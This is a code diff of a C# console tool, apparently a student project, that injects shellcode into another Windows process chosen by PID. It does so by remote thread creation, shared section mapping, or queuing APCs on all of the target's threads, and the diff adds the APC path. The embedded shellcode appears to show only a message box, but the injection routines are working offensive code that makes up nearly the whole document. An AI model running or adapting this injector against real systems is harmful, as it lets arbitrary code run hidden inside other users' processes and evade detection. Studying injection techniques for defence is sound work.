@@ -12,12 +12,61 @@ namespace ECE264project
     {
         public class Injector
         {
-            // GetCurrentProcess - kernel32.dll
-            [DllImport("kernel32.dll", SetLastError = true)]
-            static extern IntPtr GetCurrentProcess();
+            [Flags]
+            public enum SnapshotFlags : uint
+            {
+                HeapList = 0x00000001,
+                Process = 0x00000002,
+                Thread = 0x00000004,
+                Module = 0x00000008,
+                Module32 = 0x00000010,
+                All = (HeapList | Process | Thread | Module),
+                Inherit = 0x80000000,
+                NoHeaps = 0x40000000
+            }
+            [Flags]
+            public enum ThreadAccess : int
+            {
+                TERMINATE = (0x0001),
+                SUSPEND_RESUME = (0x0002),
+                GET_CONTEXT = (0x0008),
+                SET_CONTEXT = (0x0010),
+                SET_INFORMATION = (0x0020),
+                QUERY_INFORMATION = (0x0040),
+                SET_THREAD_TOKEN = (0x0080),
+                IMPERSONATE = (0x0100),
+                DIRECT_IMPERSONATION = (0x0200),
+                ALL_ACCESS = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
+            }
 
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
+            [StructLayout(LayoutKind.Sequential)]
+            public struct PROCESSENTRY32
+            {
+                public uint dwSize;
+                public uint cntUsage;
+                public uint th32ProcessID;
+                public IntPtr th32DefaultHeapID;
+                public uint th32ModuleID;
+                public uint cntThreads;
+                public uint th32ParentProcessID;
+                public int pcPriClassBase;
+                public uint dwFlags;
+            };
+
+            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+
+            public struct THREADENTRY32
+
+            {
+                public UInt32 dwSize;
+                public UInt32 cntUsage;
+                public UInt32 th32ThreadID;
+                public UInt32 th32OwnerProcessID;
+                public UInt32 tpBasePri;
+                public UInt32 tpDeltaPri;
+                public UInt32 dwFlags;
+            }
+
             [StructLayout(LayoutKind.Sequential, Pack = 0)]
             public struct OBJECT_ATTRIBUTES
             {
@@ -35,6 +84,50 @@ namespace ECE264project
                 public IntPtr UniqueThread;
             }
 
+
+
+            // GetCurrentProcess - kernel32.dll
+            [DllImport("kernel32.dll", SetLastError = true)]
+            static extern IntPtr GetCurrentProcess();
+
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
+
+
+            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+
+            [DllImport("kernel32.dll")]
+            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+            [DllImport("kernel32.dll")]
+            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, uint th32ProcessID);
+
+
+            [DllImport("kernel32.dll")]
+            static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);
+
+
+            [DllImport("kernel32.dll")]
+            static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+
+            [DllImport("kernel32.dll")]
+            static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, uint dwData);
+
+            [DllImport("kernel32.dll")]
+            static extern int SleepEx(UInt32 dwMilliseconds, bool bAlertable);
+
+
+
             [DllImport("ntdll.dll", SetLastError = true)]
             static extern uint NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
 
@@ -43,22 +136,15 @@ namespace ECE264project
 
             [DllImport("ntdll.dll", SetLastError = true)]
             static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToWrite, ref UInt32 NumberOfBytesWritten);
-            
+
             [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
             static extern int NtClose(IntPtr hObject);
 
             [DllImport("ntdll.dll", SetLastError = true)]
             static extern uint NtCreateThreadEx(ref IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);
-            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-            [DllImport("kernel32.dll")]
-           public  static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-            [DllImport("kernel32.dll")]
-            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
 
             [DllImport("ntdll.dll", SetLastError = true)]
-           public static extern UInt32 NtMapViewOfSection(
+            public static extern UInt32 NtMapViewOfSection(
                IntPtr SectionHandle,
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
@@ -80,50 +166,9 @@ namespace ECE264project
             UInt32 AllocationAttributes,
             IntPtr FileHandle);
 
-            [Flags]
-            public enum SnapshotFlags : uint
-            {
-                HeapList = 0x00000001,
-                Process = 0x00000002,
-                Thread = 0x00000004,
-                Module = 0x00000008,
-                Module32 = 0x00000010,
-                All = (HeapList | Process | Thread | Module),
-                Inherit = 0x80000000,
-                NoHeaps = 0x40000000
 
-            }
 
-            [StructLayout(LayoutKind.Sequential)]
-            public struct PROCESSENTRY32
-            {
-                public uint dwSize;
-                public uint cntUsage;
-                public uint th32ProcessID;
-                public IntPtr th32DefaultHeapID;
-                public uint th32ModuleID;
-                public uint cntThreads;
-                public uint th32ParentProcessID;
-                public int pcPriClassBase;
-                public uint dwFlags;
-            };
 
-            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
-
-            public struct THREADENTRY32
-
-            { 
-                public UInt32 dwSize;
-                public UInt32 cntUsage;
-                public UInt32 th32ThreadID;
-                public UInt32 th32OwnerProcessID;
-                public UInt32 tpBasePri;
-                public UInt32 tpDeltaPri;
-                public UInt32 dwFlags;
-            }
-
-            [DllImport("kernel32.dll", SetLastError = true)]
-            static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, uint th32ProcessID);
             public static void Main(string[] args)
             {
                 byte[] shellcode = new byte[309]
@@ -148,7 +193,7 @@ namespace ECE264project
                     0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x41,0x73,0x74,
                     0x72,0x6f,0x77,0x6f,0x72,0x6c,0x64,0x2e,0x2e,0x4d,0x79,0x20,0x50,0x6c,0x61,
                     0x6e,0x65,0x74,0x2e,0x2e,0x4d,0x79,0x20,0x68,0x6f,0x6d,0x65,0x00,0x4d,0x65,
-                    0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 
+                    0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00
                 };
 
 
@@ -228,7 +273,7 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                 Console.WriteLine(logo2);
                 uint PID;
                 uint valid = 0;
-                OBJECT_ATTRIBUTES oBJECT_ATTRIBUTES = new OBJECT_ATTRIBUTES(); 
+                OBJECT_ATTRIBUTES oBJECT_ATTRIBUTES = new OBJECT_ATTRIBUTES();
                 CLIENT_ID cLIENT_ID = new CLIENT_ID();
                 IntPtr phandle = IntPtr.Zero;
                 Console.Write("\nSelect 1, 2, or 3: ");
@@ -251,9 +296,9 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                             Console.Write("Enter a process ID: ");
                             PID = uint.Parse(Console.ReadLine());
                             phandle = DefaultInjector.ProcessHandler(PID, oBJECT_ATTRIBUTES, cLIENT_ID);
-                            IntPtr sectionHandle = SectionMapping.createSection();                   
-                            IntPtr local_address = SectionMapping.MapSection(sectionHandle, GetCurrentProcess());                       
-                            IntPtr remote_address = SectionMapping.MapSection(sectionHandle, phandle);    
+                            IntPtr sectionHandle = SectionMapping.createSection();
+                            IntPtr local_address = SectionMapping.MapSection(sectionHandle, GetCurrentProcess());
+                            IntPtr remote_address = SectionMapping.MapSection(sectionHandle, phandle);
                             result = DefaultInjector.injectShellcode(GetCurrentProcess(), local_address, shellcode, PID);
                             DefaultInjector.executeShellcode(phandle, remote_address);
                             NtClose(phandle);
@@ -263,16 +308,25 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                         case 3:
                             PROCESSENTRY32 pROCESSENTRY;
                             THREADENTRY32 tHREADENTRY32;
+                            List<UInt32> targetProcessThreadList = new List<UInt32>();
                             pROCESSENTRY.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
                             tHREADENTRY32.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));
+                            int trigger;
                             Console.Write("Enter a process ID: ");
                             PID = uint.Parse(Console.ReadLine());
-                            APC.enumerateThreads(PID);
                             phandle = DefaultInjector.ProcessHandler(PID, oBJECT_ATTRIBUTES, cLIENT_ID);
                             baseAddress = DefaultInjector.MemoryAllocater(phandle, shellcode, PID);
                             result = DefaultInjector.injectShellcode(phandle, baseAddress, shellcode, PID);
+                            targetProcessThreadList = APC.enumerateThreads(PID);
+                            result = APC.QueueAPC(baseAddress, targetProcessThreadList);
+                            Console.WriteLine("[*] APC Queue of each thread points to shellcode...waiting for thread to enter alertable state");
+                            SleepEx(2000,false);
+                            Console.WriteLine("[+] Shellcode Executed");
+                            Console.ReadLine();
+                            NtClose(phandle);
+                            valid = 1;
                             break;
-                        default:
+                      default:
                             Console.WriteLine("Please select a valid process injection technique");
                             valid = 1;
                             break;
@@ -294,7 +348,7 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                     }
                     else
                         Console.WriteLine($"[+] Successfully obtained handle to PID: {PID}");
-                        return nt_hProc;
+                    return nt_hProc;
                 }
                 public static IntPtr MemoryAllocater(IntPtr hProc, byte[] Shellcode, uint PID)
                 {
@@ -310,12 +364,12 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                     }
                     else
                         Console.WriteLine($"[+] Successfully allocated memory in remote process at 0x{nt_baseAddress.ToString("X")}");
-                        return nt_baseAddress;
+                    return nt_baseAddress;
                 }
                 public static bool injectShellcode(IntPtr hProc, IntPtr baseAddress, byte[] Shellcode, uint PID)
                 {
                     uint nt_bytesWritten = 0;
-                   //  WriteProcessMemory(hProc, baseAddress, Shellcode, Shellcode.Length, out IntPtr bytesWritten)
+                    //  WriteProcessMemory(hProc, baseAddress, Shellcode, Shellcode.Length, out IntPtr bytesWritten)
                     if (NtWriteVirtualMemory(hProc, baseAddress, Shellcode, (uint)Shellcode.Length, ref nt_bytesWritten) == 0)
                     {
                         Console.WriteLine($"[+] Succesfully injected shellcode");
@@ -323,13 +377,13 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                     }
                     else
                         Console.WriteLine($"[-] Error injecting shellcode");
-                        return false;
+                    return false;
                 }
                 public static bool executeShellcode(IntPtr hProc, IntPtr baseAddress)
                 {
                     IntPtr tHandle = IntPtr.Zero;
                     uint MAXIMUM_ALLOWED = 0x02000000;
-                   // IntPtr thHandle = CreateRemoteThread(hProc, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0x0, out thHandle);
+                    // IntPtr thHandle = CreateRemoteThread(hProc, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0x0, out thHandle);
                     if (NtCreateThreadEx(ref tHandle, MAXIMUM_ALLOWED, IntPtr.Zero, hProc, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero) != 0)
                     {
                         Console.WriteLine("[-] Error creating a remote thread");
@@ -360,7 +414,7 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                     }
                     else
                         Console.WriteLine("[-] Error creating section");
-                        return IntPtr.Zero;
+                    return IntPtr.Zero;
                 }
                 public static IntPtr MapSection(IntPtr sectionHandle, IntPtr remoteProcHandle)
                 {
@@ -373,7 +427,7 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                     if (remoteProcHandle == GetCurrentProcess())
                     {
                         IntPtr localbaseAddress = IntPtr.Zero;
-                        success_code = NtMapViewOfSection(sectionHandle, remoteProcHandle, ref localbaseAddress, UIntPtr.Zero, UIntPtr.Zero,  ref optional, ref viewSize, 2, 0, PAGE_RWX);
+                        success_code = NtMapViewOfSection(sectionHandle, remoteProcHandle, ref localbaseAddress, UIntPtr.Zero, UIntPtr.Zero, ref optional, ref viewSize, 2, 0, PAGE_RWX);
                         Console.WriteLine($"[+] Successfully mapped local section at 0x{localbaseAddress.ToString("X")}");
                         return localbaseAddress;
 
@@ -381,7 +435,7 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                     else
                     {
                         IntPtr remotebaseAddress = IntPtr.Zero;
-                        success_code = NtMapViewOfSection(sectionHandle, remoteProcHandle, ref remotebaseAddress, UIntPtr.Zero, UIntPtr.Zero,  ref optional, ref viewSize, 2, 0, PAGE_RWX);
+                        success_code = NtMapViewOfSection(sectionHandle, remoteProcHandle, ref remotebaseAddress, UIntPtr.Zero, UIntPtr.Zero, ref optional, ref viewSize, 2, 0, PAGE_RWX);
                         Console.WriteLine($"[+] Successfully mapped remote section at 0x{remotebaseAddress.ToString("X")}");
                         return remotebaseAddress;
                     }
@@ -389,15 +443,56 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                 }
             }
             public class APC
-            { 
-                public static bool enumerateThreads(uint PID)
+            {
+                public static List<UInt32> enumerateThreads(uint PID)
                 {
+                    List<UInt32> threads = new List<UInt32>();
+                    PROCESSENTRY32 pROCESSENTRY32 = new PROCESSENTRY32();
+                    THREADENTRY32 tHREADENTRY32 = new THREADENTRY32();
+                    pROCESSENTRY32.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));
+                    tHREADENTRY32.dwSize = (UInt32)Marshal.SizeOf(typeof(THREADENTRY32));
+
                     IntPtr hSnapshot = CreateToolhelp32Snapshot(SnapshotFlags.All, PID);
-                  return true;
+                    Console.WriteLine("[+] Enumerating threads of target process...");
+                    if (Thread32First(hSnapshot, ref tHREADENTRY32))
+                    {
+                        do
+                        {
+                            if (tHREADENTRY32.th32OwnerProcessID == PID)
+                            {
+                                threads.Add(tHREADENTRY32.th32ThreadID);
+                                Console.WriteLine($"     - Thread ID: {tHREADENTRY32.th32ThreadID}");
+                            }
+                        } while (Thread32Next(hSnapshot, ref tHREADENTRY32));
+
+                        return threads;
+                    }
+                    else
+                    {
+                        Console.WriteLine("[-] Error enumerating threads");
+                        return threads;
+                    }
+
+                }
+
+                public static bool QueueAPC(IntPtr baseAddress, List<UInt32> threads)
+                {
+                    IntPtr tHandle;
+                    foreach (UInt32 threadID in threads)
+                    {
+                        if (OpenThread(ThreadAccess.ALL_ACCESS, true, threadID) != IntPtr.Zero)
+                        {
+                            tHandle = OpenThread(ThreadAccess.ALL_ACCESS, true, threadID);
+                            QueueUserAPC(baseAddress, tHandle, 0);
+                        }
+                        else
+                        {
+                            Console.WriteLine($"[-] Failed to Queue APC in threadID: {threadID}");
+                        }
+                    }
+                    return true;
                 }
             }
-
         }
     }
 }
-
